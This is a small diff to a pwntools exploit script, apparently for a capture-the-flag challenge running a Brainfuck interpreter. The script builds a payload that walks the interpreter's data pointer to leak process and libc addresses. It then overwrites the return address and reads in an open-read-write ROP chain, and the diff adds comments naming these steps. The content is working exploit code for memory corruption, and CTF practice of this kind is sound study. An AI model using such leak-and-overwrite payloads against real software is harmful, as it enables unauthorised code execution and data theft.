@@ -13,11 +13,10 @@ payload1 += b">"*0x0F  # padding to proc
 payload1 += b">."*0x6  # retrieve proc
 payload1 += b">"*0x1A  # padding to libc
 payload1 += b">."*0x6  # retrieve libc
-payload1 += b"<"*0x25
-payload1 += b",>"*(29*0x08)
+payload1 += b"<"*0x25  # fallback to overwrite return addr
+payload1 += b",>"*(29*0x08)  # orw!
 
 sh.sendafter(b"BF_PARSER>>", payload1)
-
 sh.send(b"A"*520)
 # gdb.attach(sh, 'b getchar')
 # pause()
